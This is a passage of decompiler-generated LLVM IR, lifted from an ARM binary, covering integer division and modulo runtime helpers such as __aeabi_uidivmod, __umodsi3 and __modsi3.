  %v1_1402c = phi i32 [ %v1_14020, %bb89 ], [ %v1_14020, %.thread8 ], [ %v6_14020, %bb90 ]
  %v4_14024 = udiv i32 %v1_14038, 8
  %v6_14024 = icmp ult i32 %v1_14028, %v4_14024
  br i1 %v6_14024, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_14028 = and i32 %v1_14038, 4
  %v4_14028 = icmp eq i32 %v3_14028, 0
  %v6_14028 = sub i32 %v1_14028, %v4_14024
  br i1 %v4_14028, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_1402c = udiv i32 %v1_14034, 8
  %v6_1402c = or i32 %v1_1402c, %v5_1402c
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_14040 = phi i32 [ %v1_1402c, %bb91 ], [ %v1_1402c, %.thread9 ], [ %v6_1402c, %bb92 ]
  %v0_14030 = phi i32 [ %v6_14028, %bb91 ], [ %v1_14028, %.thread9 ], [ %v6_14028, %bb92 ]
  %v2_14030 = icmp eq i32 %v0_14030, 0
  br i1 %v2_14030, label %dec_label_pc_14040, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_14034, 16
  br i1 %tmp140, label %dec_label_pc_14040, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_14034 = udiv i32 %v1_14034, 16
  %v4_14038 = udiv i32 %v1_14038, 16
  br label %dec_label_pc_14000

dec_label_pc_14040:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_14040

dec_label_pc_14048:                               ; preds = %dec_label_pc_13fb4
  %v9_13fb4 = icmp eq i32 %v0_13fb4, %arg2
  %. = zext i1 %v9_13fb4 to i32
  ret i32 %.

dec_label_pc_14054:                               ; preds = %dec_label_pc_13fbc
  %v2_14054 = icmp ugt i32 %arg2, 65535
  br i1 %v2_14054, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_14054
  %v2_14058 = and i32 %arg2, 32768
  %v3_14058 = icmp eq i32 %v2_14058, 0
  %v4_14058 = udiv i32 %arg2, 65536
  br i1 %v3_14058, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_14054
  %v0_1406465 = phi i32 [ %arg2, %dec_label_pc_14054 ], [ %v4_14058, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_14068 = phi i32 [ %v0_1406465, %.thread16 ], [ %v4_14058, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_14064 = icmp ugt i32 %v1_14068, 255
  br i1 %v2_14064, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_14068 = and i32 %v1_14068, 128
  %v3_14068 = icmp eq i32 %v2_14068, 0
  %v4_14068 = udiv i32 %v1_14068, 256
  br i1 %v3_14068, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_1406c = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_14078 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_1406c, %bb100 ]
  %v1_14074 = phi i32 [ %v1_14068, %bb98 ], [ %v4_14068, %bb99 ], [ %v4_14068, %bb100 ]
  %v2_14070 = icmp ugt i32 %v1_14074, 15
  br i1 %v2_14070, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_14074 = and i32 %v1_14074, 8
  %v3_14074 = icmp eq i32 %v2_14074, 0
  %v4_14074 = udiv i32 %v1_14074, 16
  br i1 %v3_14074, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_14078 = add nsw i32 %v1_14078, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_14080 = phi i32 [ %v1_14078, %.thread17 ], [ %v1_14078, %bb101 ], [ %v2_14078, %bb102 ]
  %v5_14084 = phi i32 [ %v1_14074, %.thread17 ], [ %v4_14074, %bb101 ], [ %v4_14074, %bb102 ]
  %v2_1407c = icmp ugt i32 %v5_14084, 3
  %v7_1407c = icmp eq i32 %v5_14084, 4
  %v2_14080 = xor i1 %v7_1407c, true
  %v3_14080 = and i1 %v2_1407c, %v2_14080
  br i1 %v3_14080, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_14080 = add nsw i32 %v4_14080, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_14084 = phi i32 [ %v4_14080, %.thread18 ], [ %v5_14080, %bb103 ]
  %v2_14084 = xor i1 %v2_1407c, true
  %v3_14084 = or i1 %v7_1407c, %v2_14084
  br i1 %v3_14084, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_14084 = udiv i32 %v5_14084, 2
  %v9_14084 = add i32 %v4_14084, %v8_14084
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_14088 = phi i32 [ %v4_14084, %bb104 ], [ %v9_14084, %bb105 ]
  %v6_14088 = lshr i32 %v0_13fb4, %v1_14088
  ret i32 %v6_14088

dec_label_pc_14090:                               ; preds = %bb80
  %v0_14090 = load i32, i32* @lr, align 4
  %v0_14094 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_14090)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_14084, { 1, 0 }
  uselistorder i1 %v7_1407c, { 1, 0 }
  uselistorder i32 %v4_14074, { 1, 0 }
  uselistorder i32 %v1_14074, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14068, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_14068, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14058, { 1, 0 }
  uselistorder i32 %v0_14030, { 1, 0 }
  uselistorder i32 %v4_14024, { 1, 0 }
  uselistorder i32 %v1_1402c, { 1, 2, 0 }
  uselistorder i32 %v4_14018, { 1, 0 }
  uselistorder i32 %v1_14020, { 1, 2, 0 }
  uselistorder i32 %v4_1400c, { 1, 0 }
  uselistorder i32 %v1_14014, { 1, 2, 0 }
  uselistorder i32 %v1_14038, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_14008, { 1, 0 }
  uselistorder i32 %v1_14034, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_13ff4, { 1, 0 }
  uselistorder i32 %v3_13ff0, { 1, 0 }
  uselistorder i32 %v1_13ff0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_13ff4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13fe0, { 1, 0 }
  uselistorder i32 %v4_13fdc, { 2, 1, 0 }
  uselistorder i32 %v1_13fe0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_13fe8.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_13fb4, { 2, 5, 3, 1, 4, 0 }
  uselistorder i1 true, { 0, 1, 42, 2, 3, 4, 5, 6, 10, 11, 12, 69, 70, 71, 72, 61, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 13, 14, 89, 90, 91, 43, 60, 8, 9, 59, 7, 92, 16, 15, 48, 54, 49, 55, 46, 53, 47, 58, 93, 17, 94, 95, 18, 19, 20, 96, 62, 63, 21, 22, 97, 64, 65, 23, 24, 98, 66, 67, 25, 26, 45, 99, 100, 56, 101, 27, 50, 28, 29, 44, 30, 31, 32, 102, 103, 104, 105, 51, 106, 107, 108, 109, 110, 111, 112, 113, 37, 114, 38, 39, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 36, 129, 130, 131, 132, 133, 134, 35, 135, 41, 136, 52, 57, 40, 137, 33, 34, 68, 138 }
  uselistorder i32 15, { 11, 12, 2, 0, 20, 3, 4, 5, 6, 7, 8, 9, 13, 14, 10, 15, 16, 17, 18, 1, 19 }
  uselistorder i32 256, { 0, 1, 2, 5, 6, 7, 3, 4, 8, 11, 12, 13, 9, 10, 14, 15, 16, 17, 18, 399, 400, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 40, 38, 39, 43, 42, 41, 44, 49, 45, 48, 46, 47, 393, 50, 51, 52, 53, 396, 54, 55, 56, 57, 58, 397, 59, 60, 61, 62, 63, 64, 65, 66, 68, 67, 69, 70, 71, 72, 73, 74, 75, 77, 78, 76, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 96, 95, 97, 98, 99, 103, 109, 104, 100, 105, 110, 106, 111, 107, 101, 112, 102, 113, 114, 108, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 126, 127, 125, 128, 131, 132, 130, 129, 133, 136, 135, 134, 143, 140, 137, 138, 144, 141, 145, 142, 146, 139, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 164, 163, 165, 166, 167, 178, 173, 168, 179, 174, 175, 180, 176, 169, 170, 171, 181, 182, 183, 184, 177, 172, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 197, 196, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 210, 209, 218, 214, 211, 215, 219, 216, 220, 217, 212, 213, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 239, 238, 237, 245, 240, 251, 252, 246, 241, 253, 254, 247, 242, 255, 248, 249, 256, 250, 257, 243, 258, 244, 259, 260, 261, 262, 263, 264, 265, 268, 269, 272, 270, 266, 273, 271, 267, 276, 275, 274, 279, 280, 277, 281, 278, 282, 286, 283, 288, 287, 284, 285, 289, 394, 398, 290, 291, 292, 293, 294, 297, 295, 296, 299, 298, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 315, 314, 316, 317, 319, 318, 320, 321, 322, 323, 326, 333, 327, 328, 324, 329, 330, 331, 325, 334, 332, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 348, 347, 349, 350, 351, 355, 362, 356, 357, 363, 358, 352, 353, 359, 354, 360, 364, 361, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 378, 377, 379, 380, 381, 382, 384, 383, 385, 386, 387, 388, 389, 392, 395, 401, 390, 391 }
  uselistorder i32 128, { 15, 16, 17, 28, 2, 29, 18, 30, 19, 20, 21, 12, 31, 25, 3, 23, 4, 24, 5, 13, 14, 26, 27, 7, 0, 1, 8, 9, 10, 32, 6, 33, 22, 11 }
  uselistorder i32 255, { 10, 12, 0, 3, 14, 4, 15, 1, 16, 2, 17, 7, 18, 8, 19, 5, 20, 6, 21, 11, 13, 9, 22 }
  uselistorder i32 65536, { 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 17, 16, 18, 20, 19, 21, 1, 22, 0, 2, 23, 24, 25, 26, 27, 30, 28, 29, 31, 32, 33, 38, 39, 40, 41, 34, 35, 36, 37, 42, 45, 46, 47, 43, 44, 48, 49, 50, 51, 52, 53, 55, 54, 56, 3, 57, 59, 60, 58, 61, 62, 65, 66, 67, 63, 64, 68, 69, 70, 71, 72, 99, 74, 73, 100, 76, 75, 77, 79, 78, 81, 80, 82, 4, 83, 86, 87, 88, 84, 85, 89, 5, 90, 94, 95, 96, 91, 92, 93, 98, 97 }
  uselistorder i32 32768, { 1, 0 }
  uselistorder i32 65535, { 91, 47, 0, 1, 11, 48, 24, 49, 23, 50, 22, 51, 12, 13, 2, 26, 52, 25, 53, 54, 14, 55, 3, 27, 56, 28, 57, 29, 58, 59, 4, 30, 60, 61, 15, 62, 5, 34, 63, 33, 64, 31, 65, 32, 66, 67, 16, 68, 6, 69, 70, 38, 71, 37, 72, 35, 73, 36, 74, 17, 18, 7, 75, 39, 76, 40, 77, 78, 79, 19, 80, 81, 8, 43, 82, 41, 83, 42, 84, 85, 20, 86, 9, 10, 46, 87, 44, 88, 45, 89, 21, 90 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_14040, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_13ffc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13fe8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_140a4 = udiv i32 %arg1, %arg2
  ret i32 %v2_140a4
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_140b8 = add i32 %arg2, -1
  %v2_140b8 = icmp eq i32 %arg2, 0
  br i1 %v2_140b8, label %dec_label_pc_14174, label %dec_label_pc_140c0

dec_label_pc_140c0:                               ; preds = %entry
  %v7_140b8 = icmp eq i32 %arg2, 1
  br i1 %v7_140b8, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_140c0
  %v1_140c0 = load i32, i32* @r0, align 4
  %v10_140c0 = icmp eq i32 %v1_140c0, %arg2
  br i1 %v10_140c0, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_140c0, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_140c0 = icmp ult i32 %v1_140c0, %arg2
  br i1 %v4_140c0, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_140c8 = and i32 %v1_140b8, %arg2
  %v8_140c8 = icmp eq i32 %v6_140c8, 0
  br i1 %v8_140c8, label %.thread67, label %dec_label_pc_140d8.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_140cc = phi i32 [ %v1_140c0, %bb75 ], [ 0, %.thread65 ]
  %v3_140cc = and i32 %v1_140cc, %v1_140b8
  br label %bb76

dec_label_pc_140d8.preheader:                     ; preds = %bb75
  %v2_140d899 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_140d899, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_14168, %bb74, %bb89, %bb84, %dec_label_pc_14138, %.thread67
  %v5_140d0 = phi i32 [ %v1_140c0, %bb74 ], [ %v3_140cc, %.thread67 ], [ %v1_14114.v6_14114.v6_1411c.v6_14124, %dec_label_pc_14138 ], [ 0, %bb84 ], [ %v1_1416c, %dec_label_pc_14168 ], [ %v2_14168, %bb89 ]
  ret i32 %v5_140d0

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_140d8.preheader
  %v0_140ec.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_140d8.preheader ], [ %v4_140e0, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_140d8.preheader ], [ %v2_140e411, %.thread1.thread9 ]
  br label %dec_label_pc_140ecthread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_140d8.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_140e411, %.thread1.thread9 ], [ 0, %dec_label_pc_140d8.preheader ]
  %v0_140ec.pr33100 = phi i32 [ %v4_140e0, %.thread1.thread9 ], [ %arg2, %dec_label_pc_140d8.preheader ]
  %v4_140dc = icmp ult i32 %v0_140ec.pr33100, %v1_140c0
  br i1 %v4_140dc, label %bb78, label %dec_label_pc_140ecthread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_140e0 = and i32 %v0_140ec.pr33100, 268435456
  %v3_140e0 = icmp eq i32 %v2_140e0, 0
  %v4_140e0 = mul i32 %v0_140ec.pr33100, 16
  br i1 %v3_140e0, label %.thread1.thread9, label %dec_label_pc_140ec.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_140e411 = add i32 %storemerge101, 4
  %v2_140d8 = icmp ugt i32 %v4_140e0, 268435455
  br i1 %v2_140d8, label %.thread, label %bb77

dec_label_pc_140ecthread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_140ecthread-pre-split.loopexit

dec_label_pc_140ecthread-pre-split.loopexit:      ; preds = %dec_label_pc_140ecthread-pre-split.loopexit.loopexit, %.thread
  %v0_140ec.pr3398 = phi i32 [ %v0_140ec.pr33.lcssa, %.thread ], [ %v0_140ec.pr33100, %dec_label_pc_140ecthread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_140ecthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_140ecthread-pre-split

dec_label_pc_140ecthread-pre-split:               ; preds = %.thread4, %dec_label_pc_140ecthread-pre-split.loopexit
  %v1_140f839 = phi i32 [ %storemerge95, %dec_label_pc_140ecthread-pre-split.loopexit ], [ %v2_140f8, %.thread4 ]
  %v0_140ec.pr = phi i32 [ %v0_140ec.pr3398, %dec_label_pc_140ecthread-pre-split.loopexit ], [ %v3_140f4, %.thread4 ]
  br label %dec_label_pc_140ec

dec_label_pc_140ec.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_140ec

dec_label_pc_140ec:                               ; preds = %dec_label_pc_140ec.loopexit, %dec_label_pc_140ecthread-pre-split
  %v0_14100.pr = phi i32 [ %v1_140f839, %dec_label_pc_140ecthread-pre-split ], [ %storemerge101, %dec_label_pc_140ec.loopexit ]
  %v1_140f4 = phi i32 [ %v0_140ec.pr, %dec_label_pc_140ecthread-pre-split ], [ %v4_140e0, %dec_label_pc_140ec.loopexit ]
  %v2_140ec = icmp slt i32 %v1_140f4, 0
  br i1 %v2_140ec, label %dec_label_pc_14100, label %bb79

bb79:                                             ; preds = %dec_label_pc_140ec
  %v4_140f0 = icmp ult i32 %v1_140f4, %v1_140c0
  br i1 %v4_140f0, label %.thread4, label %dec_label_pc_14100

.thread4:                                         ; preds = %bb79
  %v3_140f4 = mul i32 %v1_140f4, 2
  %v2_140f8 = add i32 %v0_14100.pr, 1
  br label %dec_label_pc_140ecthread-pre-split

dec_label_pc_14100:                               ; preds = %bb79, %dec_label_pc_140ec
  %v2_14100 = add i32 %v0_14100.pr, -3
  %v5_14104 = icmp slt i32 %v0_14100.pr, 3
  br i1 %v5_14104, label %dec_label_pc_14144, label %dec_label_pc_14108

dec_label_pc_14108:                               ; preds = %dec_label_pc_14100, %bb83
  %v6_14130 = phi i32 [ %v0_14138, %bb83 ], [ %v2_14100, %dec_label_pc_14100 ]
  %v1_1410c = phi i32 [ %v1_14114.v6_14114.v6_1411c.v6_14124, %bb83 ], [ %v1_140c0, %dec_label_pc_14100 ]
  %v3_1412c12 = phi i32 [ %v3_1412c, %bb83 ], [ %v1_140f4, %dec_label_pc_14100 ]
  %v3_14108 = icmp ult i32 %v1_1410c, %v3_1412c12
  %v3_1410c = select i1 %v3_14108, i32 0, i32 %v3_1412c12
  %v1_14114 = sub i32 %v1_1410c, %v3_1410c
  %v4_14110 = udiv i32 %v3_1412c12, 2
  %v6_14110 = icmp ult i32 %v1_14114, %v4_14110
  %v6_14114 = select i1 %v6_14110, i32 0, i32 %v4_14110
  %v1_14114.v6_14114 = sub i32 %v1_14114, %v6_14114
  %.demorgan = and i1 %v3_14108, %v6_14110
  %v4_14118 = udiv i32 %v3_1412c12, 4
  %v6_14118 = icmp ult i32 %v1_14114.v6_14114, %v4_14118
  %v6_1411c = select i1 %v6_14118, i32 0, i32 %v4_14118
  %v1_14114.v6_14114.v6_1411c = sub i32 %v1_14114.v6_14114, %v6_1411c
  %.demorgan71 = and i1 %.demorgan, %v6_14118
  %v4_14120 = udiv i32 %v3_1412c12, 8
  %v6_14120 = icmp ult i32 %v1_14114.v6_14114.v6_1411c, %v4_14120
  %v6_14124 = select i1 %v6_14120, i32 0, i32 %v4_14120
  %v1_14114.v6_14114.v6_1411c.v6_14124 = sub i32 %v1_14114.v6_14114.v6_1411c, %v6_14124
  %.demorgan72 = and i1 %.demorgan71, %v6_14120
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_14108
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_14108, %bb80
  %v2_14128 = add i32 %v1_14114.v6_14114.v6_1411c.v6_14124, -1
  %v4_14128 = sub i32 0, %v1_14114.v6_14114.v6_1411c.v6_14124
  %v5_14128 = and i32 %v1_14114.v6_14114.v6_1411c.v6_14124, %v4_14128
  %v3_1412c = udiv i32 %v3_1412c12, 16
  %v5_14130 = icmp slt i32 %v1_14114.v6_14114.v6_1411c.v6_14124, 1
  br i1 %v5_14130, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_14130 = add i32 %v6_14130, -4
  %v9_14130 = sub i32 3, %v6_14130
  %v10_14130 = and i32 %v9_14130, %v6_14130
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_14138 = phi i32 [ %v6_14130, %bb81 ], [ %v7_14130, %bb82 ]
  %v0_1413415.in = phi i32 [ %v2_14128, %bb81 ], [ %v7_14130, %bb82 ]
  %v1_1413414.in = phi i32 [ %v5_14128, %bb81 ], [ %v10_14130, %bb82 ]
  %v1_1413414 = icmp slt i32 %v1_1413414.in, 0
  %v0_1413415 = icmp slt i32 %v0_1413415.in, 0
  %v2_14134 = xor i1 %v0_1413415, %v1_1413414
  br i1 %v2_14134, label %dec_label_pc_14138, label %dec_label_pc_14108

dec_label_pc_14138:                               ; preds = %bb83
  %v1_14138 = urem i32 %v0_14138, 4
  %v2_14138 = icmp eq i32 %v1_14138, 0
  br i1 %v2_14138, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_14138
  %v3_1413c = icmp eq i32 %v1_14114.v6_14114.v6_1411c.v6_14124, 0
  br i1 %v3_1413c, label %bb76, label %dec_label_pc_14144

dec_label_pc_14144:                               ; preds = %bb84, %dec_label_pc_14100
  %v0_14158 = phi i32 [ %v3_1412c, %bb84 ], [ %v1_140f4, %dec_label_pc_14100 ]
  %v1_14154 = phi i32 [ %v1_14114.v6_14114.v6_1411c.v6_14124, %bb84 ], [ %v1_140c0, %dec_label_pc_14100 ]
  %v0_14144 = phi i32 [ %v0_14138, %bb84 ], [ %v2_14100, %dec_label_pc_14100 ]
  %v5_14148 = icmp slt i32 %v0_14144, -2
  br i1 %v5_14148, label %dec_label_pc_14168, label %dec_label_pc_1414c

dec_label_pc_1414c:                               ; preds = %dec_label_pc_14144
  %v8_14144 = icmp eq i32 %v0_14144, -2
  br i1 %v8_14144, label %dec_label_pc_1415c, label %dec_label_pc_14150

dec_label_pc_14150:                               ; preds = %dec_label_pc_1414c
  %v3_14150 = icmp ult i32 %v1_14154, %v0_14158
  br i1 %v3_14150, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_14150
  %v2_14150 = sub i32 %v1_14154, %v0_14158
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_14150, %bb85
  %v0_1415c52 = phi i32 [ %v1_14154, %dec_label_pc_14150 ], [ %v2_14150, %bb85 ]
  %v3_14158 = udiv i32 %v0_14158, 2
  br label %dec_label_pc_1415c

dec_label_pc_1415c:                               ; preds = %dec_label_pc_1414c, %bb86
  %v0_14164 = phi i32 [ %v0_14158, %dec_label_pc_1414c ], [ %v3_14158, %bb86 ]
  %v1_14160 = phi i32 [ %v1_14154, %dec_label_pc_1414c ], [ %v0_1415c52, %bb86 ]
  %v3_1415c = icmp ult i32 %v1_14160, %v0_14164
  br i1 %v3_1415c, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_1415c
  %v2_1415c = sub i32 %v1_14160, %v0_14164
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_1415c, %bb87
  %v0_1416855 = phi i32 [ %v1_14160, %dec_label_pc_1415c ], [ %v2_1415c, %bb87 ]
  %v3_14164 = udiv i32 %v0_14164, 2
  br label %dec_label_pc_14168

dec_label_pc_14168:                               ; preds = %dec_label_pc_14144, %bb88
  %v2_1416c = phi i32 [ %v0_14158, %dec_label_pc_14144 ], [ %v3_14164, %bb88 ]
  %v1_1416c = phi i32 [ %v1_14154, %dec_label_pc_14144 ], [ %v0_1416855, %bb88 ]
  %v3_14168 = icmp ult i32 %v1_1416c, %v2_1416c
  br i1 %v3_14168, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_14168
  %v2_14168 = sub i32 %v1_1416c, %v2_1416c
  br label %bb76

dec_label_pc_14174:                               ; preds = %entry
  %v0_14174 = load i32, i32* @lr, align 4
  %v0_14178 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_14174)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1416c, { 1, 2, 0 }
  uselistorder i32 %v0_14158, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_14138, { 1, 0, 2 }
  uselistorder i32 %v7_14130, { 1, 0 }
  uselistorder i32 %v3_1412c, { 1, 0 }
  uselistorder i32 %v1_14114.v6_14114.v6_1411c.v6_14124, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_14120, { 1, 0 }
  uselistorder i32 %v4_14118, { 1, 0 }
  uselistorder i32 %v4_14110, { 1, 0 }
  uselistorder i32 %v6_14130, { 3, 0, 2, 1 }
  uselistorder i32 %v2_14100, { 1, 0 }
  uselistorder i32 %v1_140f4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_140e0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_140ec.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_140c0, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_14168, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_1415c, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_14108, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_14184 = icmp eq i32 %arg2, 0
  br i1 %v2_14184, label %dec_label_pc_14258, label %dec_label_pc_1418c

dec_label_pc_1418c:                               ; preds = %entry
  %v1_14184 = icmp slt i32 %arg2, 0
  br i1 %v1_14184, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_1418c
  %v2_1418c = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_1418c, %bb
  %v4_141a4 = phi i32 [ %arg2, %dec_label_pc_1418c ], [ %v2_1418c, %bb ]
  %v0_14190 = load i32, i32* @r0, align 4
  %v1_14190 = icmp slt i32 %v0_14190, 0
  br i1 %v1_14190, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_14194 = sub i32 0, %v0_14190
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_1419c = phi i32 [ %v0_14190, %bb79 ], [ %v2_14194, %bb80 ]
  %v1_14198 = add i32 %v4_141a4, -1
  %v7_14198 = icmp eq i32 %v4_141a4, 1
  br i1 %v7_14198, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_1419c = icmp eq i32 %v1_1419c, %v4_141a4
  br i1 %v10_1419c, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_1419c = icmp ult i32 %v1_1419c, %v4_141a4
  br i1 %v4_1419c, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_141a4 = and i32 %v1_14198, %v4_141a4
  %v8_141a4 = icmp eq i32 %v6_141a4, 0
  br i1 %v8_141a4, label %.thread72, label %dec_label_pc_141b4.preheader

dec_label_pc_141b4.preheader:                     ; preds = %bb84
  %v2_141b4109 = icmp ugt i32 %v4_141a4, 268435455
  br i1 %v2_141b4109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_141a864 = phi i32 [ %v1_1419c, %bb84 ], [ 0, %.thread70 ]
  %v3_141a8 = and i32 %v1_141a864, %v1_14198
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_141b4.preheader
  %v0_141c8.pr35.lcssa = phi i32 [ %v4_141a4, %dec_label_pc_141b4.preheader ], [ %v4_141bc, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_141b4.preheader ], [ %v2_141c09, %.thread2.thread7 ]
  br label %dec_label_pc_141c8thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_141b4.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_141c09, %.thread2.thread7 ], [ 0, %dec_label_pc_141b4.preheader ]
  %v0_141c8.pr35110 = phi i32 [ %v4_141bc, %.thread2.thread7 ], [ %v4_141a4, %dec_label_pc_141b4.preheader ]
  %v4_141b8 = icmp ult i32 %v0_141c8.pr35110, %v1_1419c
  br i1 %v4_141b8, label %bb86, label %dec_label_pc_141c8thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_141bc = and i32 %v0_141c8.pr35110, 268435456
  %v3_141bc = icmp eq i32 %v2_141bc, 0
  %v4_141bc = mul i32 %v0_141c8.pr35110, 16
